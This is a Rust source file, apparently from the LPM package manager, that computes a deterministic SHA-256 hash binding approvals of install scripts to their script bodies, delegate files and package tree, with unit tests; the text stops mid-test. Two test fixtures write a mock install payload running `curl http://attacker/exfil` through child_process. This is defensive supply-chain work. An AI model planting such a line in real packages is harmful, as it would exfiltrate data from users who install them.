//! Deterministic SHA-256 identity for a package's install-time lifecycle scripts.
//!
//! The `script_hash` side of the `{name, version, source, integrity,
//! script_hash}` approval binding. The hash covers the lifecycle phase bodies
//! plus the complete package-owned file tree. Hashing the tree is deliberately
//! conservative: JavaScript and shell can resolve executable files dynamically,
//! so a static import parser cannot prove that a partial dependency graph is
//! complete. The hash is deterministic across machines: same package contents
//! produce the same hash.
//!
//! ## Hash format
//!
//! `sha256-<hex>` (lowercase hex, prefixed). Matches the SRI-style prefix
//! pattern used elsewhere in LPM (lockfile integrity is `sha512-<base64>`).
//! The prefix is intentional so future hash-algorithm migrations are
//! self-describing in the trust store.
//!
//! ## Hash input
//!
//! For each phase in [`crate::EXECUTED_INSTALL_PHASES`] (in fixed order):
//!
//! 1. The phase name as bytes (e.g., `"preinstall"`)
//! 2. A NUL separator (`\x00`)
//! 3. The script body as bytes if present, OR the empty byte sequence if absent
//! 4. **If the phase body delegates to an in-package file** (any
//!    shape that [`crate::static_gate::extract_delegate_path`]
//!    recognizes — bare `node <path>` and `node -e <softfail wrapper>`
//!    today) — a unit separator (`\x1f` — ASCII US), the delegate
//!    path as bytes, a NUL separator, and the SHA-256 of the
//!    delegated file's bytes. The delegate file is read from the same
//!    `store_pkg_dir` the `package.json` came from, so the hash binds
//!    the executed code AND the entry point in lockstep. Without this
//!    step, two versions of a package with byte-identical scripts
//!    maps but different `install.js` bytes would produce the same
//!    hash, and a content-blind `StrictBinding` would silently re-use
//!    the prior approval across a malicious upgrade.
//! 5. A record separator (`\x1e` — ASCII RS) between phases
//! 6. Every package-owned regular file, directory, and symlink in sorted path
//!    order. Dependency-link directories (`node_modules`) and LPM-generated
//!    store/build sidecars are excluded because they are not source content.
//!
//! Empty phases are explicitly hashed as the empty string so removing a
//! script from one phase and adding a different one in another phase
//! produces a different hash. This is stronger than "hash the JSON of
//! present scripts only" — it forecloses an attack where a maintainer
//! moves a payload between phases to keep the hash stable.
//!
//! ## Delegate recognition — shared parser
//!
//! Step 4 dispatches through [`crate::static_gate::extract_delegate_path`]
//! — the single source of truth shared with
//! `lpm_cli::build_state::parse_delegated_paths` and with the static
//! gate's own classifier branches (`matches_node_relative`,
//! `matches_delegating_identity_green`, `matches_node_eval_softfail_green`).
//! Every script-body shape the static gate classifies as Green via a
//! delegate-to-local-file branch is also detected here, including the
//! 3-token softfail wrapper form (`node -e "try{require('./x.js')}catch(e){}"`).
//! Keeping these three call sites on one parser closes the gap where a
//! looser shape would be greenlit for trust without the corresponding
//! delegate-file binding in the hash. Any future classifier change
//! that widens the Green set with a new delegate shape MUST extend
//! the shared parser in the same change — the contract note on
//! `extract_delegate_path` itself spells this out.
//!
//! ## Source of truth
//!
//! The package.json read is from `<store>/<safe_name>@<version>/package.json`
//! (the GLOBAL STORE), NOT from a project-local `node_modules/` symlink.
//! This matches what the build pipeline actually executes, and forecloses
//! an attack where a project-local symlink edit (e.g., to a workspace
//! member's manifest) drifts the observed hash from the executed bytes.

use sha2::{Digest, Sha256};
use std::collections::{HashSet, VecDeque};
use std::io::{BufReader, Read};
use std::path::{Component, Path, PathBuf};
use std::sync::OnceLock;

use crate::EXECUTED_INSTALL_PHASES;
use crate::static_gate::extract_delegate_path;

/// Record separator between phases in the hash input.
/// ASCII RS (Record Separator) — distinct from any byte that can appear
/// in a JSON string body, so it cannot collide with script content.
const RECORD_SEP: u8 = 0x1e;

/// Field separator inside one phase entry, between the phase name and body.
/// ASCII NUL — also distinct from any byte that can appear in a JSON string
/// body (JSON forbids NUL inside strings unless escaped).
const FIELD_SEP: u8 = 0x00;

/// Unit separator that prefixes a delegate-file annotation appended
/// after a phase body when the body matches a `node <path>` delegate
/// shape (see [`crate::static_gate::extract_delegate_path`]). Distinct
/// from `RECORD_SEP` so the annotation can be distinguished from the
/// start of the next phase.
const DELEGATE_SEP: u8 = 0x1f;
const PACKAGE_TREE_SEP: u8 = 0x1d;
const MAX_DELEGATE_GRAPH_FILES: usize = 128;
const MAX_DELEGATE_GRAPH_DEPTH: usize = 16;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptHashWithPhaseBodies {
    pub hash: Option<String>,
    pub phase_bodies: Vec<(String, String)>,
}

/// Compute the deterministic install-script hash for a package located at
/// the given store directory.
///
/// `store_pkg_dir` is typically `lpm_store::PackageStore::package_dir(name, version)`.
///
/// Returns:
/// - `Some("sha256-<hex>")` if the package's `package.json` contains at
///   least one of the [`EXECUTED_INSTALL_PHASES`] entries with a non-empty body
///   and its delegated executable graph can be read completely
/// - `None` if the manifest is unavailable, no install-time lifecycle scripts
///   exist, or the package content and recognized delegate graph cannot be read
///   completely; callers that know scripts exist must treat an unavailable
///   hash as untrusted
///
/// The function reads the package tree but writes nothing. Symlinks that
/// resolve outside `store_pkg_dir` make the identity unavailable.
pub fn compute_script_hash(store_pkg_dir: &Path) -> Option<String> {
    compute_script_hash_with_phase_bodies(store_pkg_dir)?.hash
}

pub fn compute_script_hash_with_phase_bodies(
    store_pkg_dir: &Path,
) -> Option<ScriptHashWithPhaseBodies> {
    let pkg_json_path = store_pkg_dir.join("package.json");
    let content = std::fs::read_to_string(&pkg_json_path).ok()?;
    let parsed: serde_json::Value = serde_json::from_str(&content).ok()?;
    let scripts = parsed.get("scripts")?.as_object()?;

    let mut hasher = Sha256::new();
    let mut complete = true;
    let mut phase_bodies = Vec::with_capacity(EXECUTED_INSTALL_PHASES.len());
    for (i, phase) in EXECUTED_INSTALL_PHASES.iter().enumerate() {
        if i > 0 {
            hasher.update([RECORD_SEP]);
        }
        hasher.update(phase.as_bytes());
        hasher.update([FIELD_SEP]);
        // Empty phases are explicitly hashed as the empty string. The
        // FIELD_SEP separator before this update guarantees that
        // `(empty preinstall, "x" install)` and `("x" preinstall, empty install)`
        // produce different hashes even though the concatenated bodies are
        // identical.
        let body = scripts.get(*phase).and_then(|v| v.as_str()).unwrap_or("");
        if !body.is_empty() {
            phase_bodies.push(((*phase).to_string(), body.to_string()));
        }
        hasher.update(body.as_bytes());

        // Delegate-body extension. When the body matches a
        // `node <path>` delegate shape, hash the in-package file's
        // bytes too. The annotation embeds (a) the relative path
        // exactly as it appears in the script body, plus (b) the
        // SHA-256 of the delegated file's actual bytes. Path +
        // content-digest together so a malicious upgrade can't
        // rename `install.js` → `install2.js` to keep the same
        // content-digest while changing entry points (rename →
        // different annotation → different hash).
        //
        // A partial graph cannot safely identify the executable bytes. Keep
        // the phase bodies for review, but withhold a reusable hash so trust
        // and advisor approvals fail closed.
        if let Some(rel_path) = extract_delegate_path(body) {
            complete &= hash_delegate_graph(&mut hasher, store_pkg_dir, &rel_path);
        }
    }

    if phase_bodies.is_empty() {
        return None;
    }

    hasher.update([PACKAGE_TREE_SEP]);
    let manifest_identity = canonical_manifest_identity(&parsed);
    complete &= manifest_identity
        .as_deref()
        .is_some_and(|manifest| hash_package_tree(&mut hasher, store_pkg_dir, manifest));

    Some(ScriptHashWithPhaseBodies {
        hash: complete.then(|| format!("sha256-{}", hex_lower(&hasher.finalize()))),
        phase_bodies,
    })
}

fn hash_package_tree(hasher: &mut Sha256, root: &Path, manifest_identity: &[u8]) -> bool {
    let Ok(canonical_root) = root.canonicalize() else {
        return false;
    };
    let mut relative = PathBuf::new();
    hash_package_tree_dir(
        hasher,
        root,
        root,
        &canonical_root,
        &mut relative,
        manifest_identity,
    )
}

fn hash_package_tree_dir(
    hasher: &mut Sha256,
    root: &Path,
    dir: &Path,
    canonical_root: &Path,
    relative: &mut PathBuf,
    manifest_identity: &[u8],
) -> bool {
    let Ok(read_dir) = std::fs::read_dir(dir) else {
        return false;
    };
    let mut entries = Vec::new();
    for entry in read_dir {
        let Ok(entry) = entry else {
            return false;
        };
        let Ok(file_type) = entry.file_type() else {
            return false;
        };
        entries.push((entry.file_name(), entry.path(), file_type));
    }
    entries.sort_unstable_by(|left, right| left.0.cmp(&right.0));

    for (name, path, file_type) in entries {
        if (dir == root && name == "node_modules") || is_generated_package_entry(root, dir, &name) {
            continue;
        }
        relative.push(&name);
        let Some(relative_display) = stable_relative_path(relative) else {
            return false;
        };
        let complete = if file_type.is_dir() {
            hash_tree_record(hasher, b"dir", relative_display.as_bytes(), &[]);
            hash_package_tree_dir(
                hasher,
                root,
                &path,
                canonical_root,
                relative,
                manifest_identity,
            )
        } else if file_type.is_file() {
            if dir == root && name == "package.json" {
                hash_tree_record(
                    hasher,
                    b"manifest",
                    relative_display.as_bytes(),
                    manifest_identity,
                );
                true
            } else {
                hash_package_file(hasher, relative_display.as_bytes(), &path)
            }
        } else if file_type.is_symlink() {
            let Ok(target) = std::fs::read_link(&path) else {
                return false;
            };
            let Ok(canonical_target) = path.canonicalize() else {
                return false;
            };
            if !canonical_target.starts_with(canonical_root) {
                return false;
            }
            let Some(target) = target.to_str() else {
                return false;
            };
            hash_tree_record(
                hasher,
                b"symlink",
                relative_display.as_bytes(),
                target.as_bytes(),
            );
            true
        } else {
            false
        };
        relative.pop();
        if !complete {
            return false;
        }
    }
    true
}

fn canonical_manifest_identity(manifest: &serde_json::Value) -> Option<Vec<u8>> {
    let mut output = Vec::new();
    write_canonical_json(manifest, &mut output).then_some(output)
}

fn write_canonical_json(value: &serde_json::Value, output: &mut Vec<u8>) -> bool {
    match value {
        serde_json::Value::Object(map) => {
            output.push(b'{');
            let mut entries: Vec<_> = map.iter().collect();
            entries.sort_unstable_by(|(left, _), (right, _)| left.cmp(right));
            for (index, (key, value)) in entries.into_iter().enumerate() {
                if index != 0 {
                    output.push(b',');
                }
                if serde_json::to_writer(&mut *output, key).is_err() {
                    return false;
                }
                output.push(b':');
                if !write_canonical_json(value, output) {
                    return false;
                }
            }
            output.push(b'}');
            true
        }
        serde_json::Value::Array(values) => {
            output.push(b'[');
            for (index, value) in values.iter().enumerate() {
                if index != 0 {
                    output.push(b',');
                }
                if !write_canonical_json(value, output) {
                    return false;
                }
            }
            output.push(b']');
            true
        }
        _ => serde_json::to_writer(output, value).is_ok(),
    }
}

fn hash_package_file(hasher: &mut Sha256, relative: &[u8], path: &Path) -> bool {
    let Ok(file) = std::fs::File::open(path) else {
        return false;
    };
    let mut reader = BufReader::new(file);
    let mut buffer = [0_u8; 64 * 1024];
    let mut content_hasher = Sha256::new();
    loop {
        let Ok(read) = reader.read(&mut buffer) else {
            return false;
        };
        if read == 0 {
            break;
        }
        content_hasher.update(&buffer[..read]);
    }
    hash_tree_record(hasher, b"file", relative, &content_hasher.finalize());
    true
}

fn hash_tree_record(hasher: &mut Sha256, kind: &[u8], relative: &[u8], payload: &[u8]) {
    hasher.update(kind);
    hasher.update(b"\0");
    hasher.update(relative);
    hasher.update(b"\0");
    hasher.update((payload.len() as u64).to_le_bytes());
    hasher.update(payload);
}

fn stable_relative_path(path: &Path) -> Option<String> {
    let mut output = String::new();
    for component in path.components() {
        let Component::Normal(part) = component else {
            return None;
        };
        let part = part.to_str()?;
        if !output.is_empty() {
            output.push('/');
        }
        output.push_str(part);
    }
    Some(output)
}

fn is_generated_package_entry(root: &Path, dir: &Path, name: &std::ffi::OsStr) -> bool {
    if dir != root {
        return false;
    }
    matches!(
        name.to_str(),
        Some(
            ".integrity"
                | ".lpm-security.json"
                | ".lpm-object-integrity"
                | ".lpm-tree-snapshot.json"
                | ".lpm-built"
                | ".lpm-build-tmp"
                | ".lpm-build-complete"
        )
    ) || name.to_str().is_some_and(|name| {
        name.starts_with(".lpm-tree-snapshot.json.tmp.")
            || name.starts_with("..lpm-tree-snapshot.json.tmp.")
            || name.starts_with(".lpm-object-integrity.tmp.")
            || name.starts_with("..lpm-object-integrity.tmp.")
    })
}

fn hash_delegate_graph(hasher: &mut Sha256, store_pkg_dir: &Path, rel_path: &str) -> bool {
    let Some(entry_rel) = normalize_relative_path(rel_path) else {
        return false;
    };

    let Ok(root) = store_pkg_dir.canonicalize() else {
        return false;
    };
    let mut queue = VecDeque::from([(entry_rel, 0usize)]);
    let mut seen = HashSet::new();
    let mut visited = 0usize;

    while let Some((rel, depth)) = queue.pop_front() {
        if !seen.insert(rel.clone()) {
            continue;
        }
        if visited >= MAX_DELEGATE_GRAPH_FILES {
            return false;
        }
        visited += 1;

        let rel_display = path_to_slash_string(&rel);
        hasher.update([DELEGATE_SEP]);
        hasher.update(rel_display.as_bytes());
        hasher.update([FIELD_SEP]);

        let abs = store_pkg_dir.join(&rel);
        let canonical = match abs.canonicalize() {
            Ok(path) => path,
            Err(_) => return false,
        };
        if !canonical.starts_with(&root) {
            return false;
        }

        let bytes = match std::fs::read(&canonical) {
            Ok(bytes) => bytes,
            Err(_) => return false,
        };
        let mut inner = Sha256::new();
        inner.update(&bytes);
        hasher.update(inner.finalize());

        let Some(mut next) = discover_local_js_dependencies(
            &bytes,
            rel.parent().unwrap_or(Path::new("")),
            store_pkg_dir,
        ) else {
            return false;
        };
        next.sort();
        if depth >= MAX_DELEGATE_GRAPH_DEPTH && !next.is_empty() {
            return false;
        }
        for candidate in next {
            if !seen.contains(&candidate) {
                queue.push_back((candidate, depth + 1));
            }
        }
    }

    true
}

fn discover_local_js_dependencies(
    bytes: &[u8],
    base_dir: &Path,
    store_pkg_dir: &Path,
) -> Option<Vec<PathBuf>> {
    let text = String::from_utf8_lossy(bytes);
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    for regex in import_regexes() {
        for capture in regex.captures_iter(&text) {
            let Some(spec) = capture.get(1).map(|m| m.as_str()) else {
                continue;
            };
            if !(spec.starts_with("./") || spec.starts_with("../")) {
                continue;
            }
            let candidate = resolve_local_js_specifier(store_pkg_dir, base_dir, spec)?;
            if seen.insert(candidate.clone()) {
                out.push(candidate);
            }
        }
    }
    Some(out)
}

fn import_regexes() -> &'static [regex::Regex] {
    static REGEXES: OnceLock<Vec<regex::Regex>> = OnceLock::new();
    REGEXES.get_or_init(|| {
        [
            r#"require\s*\(\s*['"]([^'"]+)['"]\s*\)"#,
            r#"import\s*\(\s*['"]([^'"]+)['"]\s*\)"#,
            r#"(?m)\bimport\s+(?:[^'";]+?\s+from\s+)?['"]([^'"]+)['"]"#,
            r#"(?m)\bexport\s+[^'";]+?\s+from\s+['"]([^'"]+)['"]"#,
        ]
        .into_iter()
        .map(|pattern| regex::Regex::new(pattern).expect("valid script dependency regex"))
        .collect()
    })
}

fn resolve_local_js_specifier(
    store_pkg_dir: &Path,
    base_dir: &Path,
    specifier: &str,
) -> Option<PathBuf> {
    let path = normalize_relative_path(base_dir.join(specifier))?;
    let candidates = js_resolution_candidates(path);
    candidates
        .iter()
        .find(|candidate| std::fs::symlink_metadata(store_pkg_dir.join(candidate)).is_ok())
        .cloned()
}

fn js_resolution_candidates(path: PathBuf) -> Vec<PathBuf> {
    if matches!(
        path.extension().and_then(|s| s.to_str()),
        Some("js" | "cjs" | "mjs")
    ) {
        return vec![path];
    }

    let mut out = Vec::with_capacity(6);
    for ext in ["js", "cjs", "mjs"] {
        let mut candidate = path.clone();
        candidate.set_extension(ext);
        out.push(candidate);
    }
    for ext in ["js", "cjs", "mjs"] {
        out.push(path.join(format!("index.{ext}")));
    }
    out
}

fn normalize_relative_path(path: impl AsRef<Path>) -> Option<PathBuf> {
    let mut out = PathBuf::new();
    for component in path.as_ref().components() {
        match component {
            Component::CurDir => {}
            Component::Normal(part) => out.push(part),
            Component::ParentDir => {
                if !out.pop() {
                    return None;
                }
            }
            Component::RootDir | Component::Prefix(_) => return None,
        }
    }
    if out.as_os_str().is_empty() {
        None
    } else {
        Some(out)
    }
}

fn path_to_slash_string(path: &Path) -> String {
    path.components()
        .filter_map(|component| match component {
            Component::Normal(part) => Some(part.to_string_lossy()),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join("/")
}

/// Encode bytes as lowercase hex without pulling in a hex crate.
/// Used by [`compute_script_hash`] to produce the `sha256-<hex>` form.
fn hex_lower(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0x0f) as usize] as char);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    fn write_pkg_json(dir: &Path, scripts: &serde_json::Value) {
        let pkg = serde_json::json!({
            "name": "@test/pkg",
            "version": "1.0.0",
            "scripts": scripts,
        });
        fs::write(
            dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    #[test]
    fn compute_script_hash_format_starts_with_sha256_prefix() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fs::write(dir.path().join("install.js"), "module.exports = true\n").unwrap();
        let hash = compute_script_hash(dir.path()).unwrap();
        assert!(
            hash.starts_with("sha256-"),
            "hash must use sha256- prefix, got: {hash}"
        );
        // sha256 hex is 64 chars + "sha256-" prefix = 71
        assert_eq!(hash.len(), 71);
    }

    #[test]
    fn compute_script_hash_returns_none_when_no_install_phases() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            // Only non-install phases — must be ignored, returns None
            &serde_json::json!({"build": "tsc", "test": "vitest", "prepare": "husky"}),
        );
        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[test]
    fn compute_script_hash_with_phase_bodies_returns_canonical_non_empty_phases() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({
                "postinstall": "echo post",
                "install": "node install.js",
                "preinstall": "",
                "prepare": "ignored",
            }),
        );
        fs::write(dir.path().join("install.js"), "module.exports = true\n").unwrap();

        let combined = compute_script_hash_with_phase_bodies(dir.path()).unwrap();
        assert_eq!(
            combined.hash,
            Some(compute_script_hash(dir.path()).expect("script hash"))
        );
        assert_eq!(
            combined.phase_bodies,
            vec![
                ("install".to_string(), "node install.js".to_string()),
                ("postinstall".to_string(), "echo post".to_string()),
            ]
        );
    }

    #[test]
    fn compute_script_hash_returns_none_when_no_package_json() {
        let dir = tempdir().unwrap();
        // No package.json at all
        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[test]
    fn compute_script_hash_returns_none_when_package_json_malformed() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("package.json"), "{not valid json").unwrap();
        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[test]
    fn compute_script_hash_returns_none_when_no_scripts_field() {
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{"name":"x","version":"1.0.0"}"#,
        )
        .unwrap();
        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[test]
    fn compute_script_hash_deterministic_across_calls() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({
                "preinstall": "echo pre",
                "install": "node install.js",
                "postinstall": "echo done",
            }),
        );
        fs::write(dir.path().join("install.js"), "module.exports = true\n").unwrap();
        let h1 = compute_script_hash(dir.path()).unwrap();
        let h2 = compute_script_hash(dir.path()).unwrap();
        let h3 = compute_script_hash(dir.path()).unwrap();
        assert_eq!(h1, h2);
        assert_eq!(h2, h3);
    }

    #[test]
    fn compute_script_hash_same_input_same_output_across_machines() {
        // Pin the hash for a known fixture so any future change to the
        // hash function (input format, separator bytes, prefix,
        // delegate-binding extension) is caught by an exact-match
        // assertion. The byte stream is:
        //
        //   "preinstall" \x00
        //   \x1e
        //   "install" \x00 "node install.js"
        //   \x1f "install.js" \x00 <sha256(install.js bytes)>
        //   \x1e
        //   "postinstall" \x00
        //
        // (preinstall and postinstall bodies are empty; install body is
        // a delegate-shape that triggers the binding to install.js.)
        //
        // The literal below is computed by running this test once with a
        // placeholder, copying the actual output, and locking it. To
        // intentionally change the hash function: bump the trust store
        // schema version AND update this literal in the same commit.
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"install": "node install.js"}),
        );
        fs::write(
            dir.path().join("install.js"),
            b"console.log('hi from v1')\n",
        )
        .unwrap();
        let hash = compute_script_hash(dir.path()).unwrap();
        assert_eq!(
            hash, EXPECTED_FIXTURE_HASH,
            "fixture hash drift: the script-hash function changed its byte \
             format. Update EXPECTED_FIXTURE_HASH at the top of this test \
             AND bump the trust store schema version in build_state.rs."
        );
    }

    /// Locked fixture hash for [`compute_script_hash_same_input_same_output_across_machines`].
    /// Includes the delegate-binding annotation for install.js.
    const EXPECTED_FIXTURE_HASH: &str =
        "sha256-a44ae331ecc66f547414f954845a0acd9b75c538acbbbaa3e85c7876cbc6c312";

    #[test]
    fn compute_script_hash_phase_reorder_in_json_yields_same_hash() {
        // The input ordering inside `scripts` is JSON-object-key-order
        // (which is preserved by serde_json::Value as a BTreeMap or
        // IndexMap depending on features). The hash function reads via
        // EXECUTED_INSTALL_PHASES in fixed order, NOT via JSON iteration.
        // So `{"postinstall": "x", "preinstall": "y"}` and
        // `{"preinstall": "y", "postinstall": "x"}` MUST produce the
        // same hash.
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        // Different key order in the source JSON:
        fs::write(
            dir1.path().join("package.json"),
            r#"{"name":"x","version":"1","scripts":{"postinstall":"a","preinstall":"b"}}"#,
        )
        .unwrap();
        fs::write(
            dir2.path().join("package.json"),
            r#"{"name":"x","version":"1","scripts":{"preinstall":"b","postinstall":"a"}}"#,
        )
        .unwrap();
        let h1 = compute_script_hash(dir1.path()).unwrap();
        let h2 = compute_script_hash(dir2.path()).unwrap();
        assert_eq!(
            h1, h2,
            "JSON key reorder must NOT affect the hash; \
             the function reads by fixed phase order"
        );
    }

    #[test]
    fn compute_script_hash_binds_nonexecuted_manifest_scripts_as_package_content() {
        // The phase-body prefix covers only what LPM executes directly, but a
        // lifecycle entry point can read and execute other manifest fields at
        // runtime. The canonical package-content suffix therefore binds them.
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(
            dir1.path(),
            &serde_json::json!({"install": "node install.js"}),
        );
        write_pkg_json(
            dir2.path(),
            &serde_json::json!({
                "install": "node install.js",
                "prepare": "this should not affect the hash",
                "build": "tsc",
                "test": "vitest",
            }),
        );
        fs::write(dir1.path().join("install.js"), "module.exports = true\n").unwrap();
        fs::write(dir2.path().join("install.js"), "module.exports = true\n").unwrap();
        let h1 = compute_script_hash(dir1.path()).unwrap();
        let h2 = compute_script_hash(dir2.path()).unwrap();
        assert_ne!(
            h1, h2,
            "manifest script changes must affect the package-content identity"
        );
    }

    #[test]
    fn compute_script_hash_changes_when_install_body_changes() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(dir1.path(), &serde_json::json!({"install": "node a.js"}));
        write_pkg_json(dir2.path(), &serde_json::json!({"install": "node b.js"}));
        fs::write(dir1.path().join("a.js"), "module.exports = true\n").unwrap();
        fs::write(dir2.path().join("b.js"), "module.exports = true\n").unwrap();
        assert_ne!(
            compute_script_hash(dir1.path()).unwrap(),
            compute_script_hash(dir2.path()).unwrap(),
        );
    }

    #[test]
    fn compute_script_hash_changes_when_postinstall_body_changes() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(dir1.path(), &serde_json::json!({"postinstall": "echo a"}));
        write_pkg_json(dir2.path(), &serde_json::json!({"postinstall": "echo b"}));
        assert_ne!(
            compute_script_hash(dir1.path()).unwrap(),
            compute_script_hash(dir2.path()).unwrap(),
        );
    }

    #[test]
    fn compute_script_hash_changes_when_preinstall_body_changes() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(dir1.path(), &serde_json::json!({"preinstall": "echo a"}));
        write_pkg_json(dir2.path(), &serde_json::json!({"preinstall": "echo b"}));
        assert_ne!(
            compute_script_hash(dir1.path()).unwrap(),
            compute_script_hash(dir2.path()).unwrap(),
        );
    }

    // ─────────────────────────────────────────────────────────────────
    // Delegate-body binding — every `node <path>` shape the static gate
    // greenlights must bind the in-package file bytes into the hash.
    // Without this, an upgrade that swaps the delegated file while
    // keeping the script body string identical would silently re-use
    // the prior approval (the integrity slot would differ, but the
    // script_hash would not, so a re-approval review wouldn't even
    // be able to compare body bytes).
    // ─────────────────────────────────────────────────────────────────

    /// Two packages with IDENTICAL `postinstall: "node install.js"`
    /// strings but DIFFERENT `install.js` bytes MUST produce different
    /// `script_hash` values.
    #[test]
    fn compute_script_hash_changes_when_delegate_file_body_changes() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(
            dir1.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        write_pkg_json(
            dir2.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fs::write(dir1.path().join("install.js"), b"console.log('hi')\n").unwrap();
        fs::write(
            dir2.path().join("install.js"),
            b"require('child_process').execSync('curl http://attacker/exfil')\n",
        )
        .unwrap();
        let h1 = compute_script_hash(dir1.path()).unwrap();
        let h2 = compute_script_hash(dir2.path()).unwrap();
        assert_ne!(h1, h2);
    }

    #[test]
    fn compute_script_hash_changes_when_reachable_required_file_changes() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(
            dir1.path(),
            &serde_json::json!({"postinstall": "node setup.js"}),
        );
        write_pkg_json(
            dir2.path(),
            &serde_json::json!({"postinstall": "node setup.js"}),
        );
        fs::write(dir1.path().join("setup.js"), b"require('./payload.js')\n").unwrap();
        fs::write(dir2.path().join("setup.js"), b"require('./payload.js')\n").unwrap();
        fs::write(
            dir1.path().join("payload.js"),
            b"module.exports = 'benign'\n",
        )
        .unwrap();
        fs::write(
            dir2.path().join("payload.js"),
            b"require('child_process').execSync('curl http://attacker/exfil')\n",
        )
        .unwrap();

        assert_ne!(
            compute_script_hash(dir1.path()).unwrap(),
            compute_script_hash(dir2.path()).unwrap(),
            "changes in files statically required by the delegated entry point must affect script_hash"
        );
    }

    /// Every spelling the static gate greenlights via a
    /// delegate-to-local-file branch must produce a distinct hash
    /// when the delegate file body changes. Covers the three branches
    /// the classifier accepts:
    ///
    /// - [`crate::static_gate::matches_node_relative`] — bare
    ///   non-reserved-basename `node <path>`
    /// - [`crate::static_gate::matches_delegating_identity_green`] —
    ///   bare reserved-basename `node install.js` etc. (with manifest
    ///   identity context the classifier separately validates)
    /// - [`crate::static_gate::matches_node_eval_softfail_green`] —
    ///   3-token `node -e <try-require-catch>` and
    ///   `node -e <import-catch>` wrapper shapes
    ///
    /// If a future classifier change adds a new greenlit delegate
    /// shape, the canonical procedure is: extend
    /// `crate::static_gate::extract_delegate_path`, then add an entry
    /// to this table. Drift between the two — a Green-classified
    /// shape that `extract_delegate_path` doesn't recognize — is the
    /// cross-version content-drift surface the H17 fix closes, and
    /// recreating that drift here will silently reopen it.
    #[test]
    fn compute_script_hash_binds_delegate_for_every_greenlit_node_path_spelling() {
        let spellings: &[(&str, &str)] = &[
            // Bare delegate, reserved basenames (matches_delegating_identity_green)
            ("install.js", "node install.js"),
            ("install.js", "node ./install.js"),
            ("install.cjs", "node install.cjs"),
            ("install.mjs", "node install.mjs"),
            ("postinstall.js", "node postinstall.js"),
            ("preinstall.js", "node preinstall.js"),
            // Bare delegate, non-reserved basenames (matches_node_relative,
            // greenlit unconditionally)
            ("my-build.js", "node my-build.js"),
            ("scripts/install.js", "node scripts/install.js"),
            // Softfail wrappers (matches_node_eval_softfail_green) —
            // node -e with try/require/catch around an in-package file
            (
                "scripts/setup.js",
                "node -e \"try{require('./scripts/setup.js')}catch(e){}\"",
            ),
            (
                "bootstrap.cjs",
                "node -e \"try{require('./bootstrap.cjs')}catch(e){}\"",
            ),
            (
                "init.mjs",
                "node -e \"import('./init.mjs').catch(() => void 0)\"",
            ),
            // --eval is the long-form alias for -e
            (
                "scripts/setup.js",
                "node --eval \"try{require('./scripts/setup.js')}catch(e){}\"",
            ),
        ];
        for (file, body) in spellings {
            let dir1 = tempdir().unwrap();
            let dir2 = tempdir().unwrap();
            write_pkg_json(dir1.path(), &serde_json::json!({"postinstall": body}));
            write_pkg_json(dir2.path(), &serde_json::json!({"postinstall": body}));
            if let Some(parent) = std::path::Path::new(file).parent()
                && !parent.as_os_str().is_empty()
            {
                fs::create_dir_all(dir1.path().join(parent)).unwrap();
                fs::create_dir_all(dir2.path().join(parent)).unwrap();
            }
            fs::write(dir1.path().join(file), b"benign\n").unwrap();
            fs::write(dir2.path().join(file), b"malicious\n").unwrap();
            let h1 = compute_script_hash(dir1.path()).unwrap();
            let h2 = compute_script_hash(dir2.path()).unwrap();
            assert_ne!(h1, h2, "spelling {body:?} must bind {file:?} into the hash");
        }
    }

    /// Renaming the delegate target (e.g., `install.js` →
    /// `install.cjs`) MUST change the hash even when the file bytes
    /// are byte-identical, because the path is part of the
    /// annotation. Otherwise a malicious maintainer could ship the
    /// same body under a different entry-point name to dodge
    /// `BindingDrift` detection.
    #[test]
    fn compute_script_hash_changes_when_delegate_file_path_changes() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(
            dir1.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        write_pkg_json(
            dir2.path(),
            &serde_json::json!({"postinstall": "node install.cjs"}),
        );
        fs::write(dir1.path().join("install.js"), b"console.log('hi')\n").unwrap();
        fs::write(dir2.path().join("install.cjs"), b"console.log('hi')\n").unwrap();
        let h1 = compute_script_hash(dir1.path()).unwrap();
        let h2 = compute_script_hash(dir2.path()).unwrap();
        assert_ne!(h1, h2);
    }

    /// Static delegate recognition is not a security boundary. Even when a
    /// phase body has no recognized delegate, package-content changes must
    /// invalidate the reusable identity because shell and JavaScript can load
    /// executable bytes dynamically.
    #[test]
    fn compute_script_hash_binds_package_files_when_body_is_not_delegate_shape() {
        let dir = tempdir().unwrap();
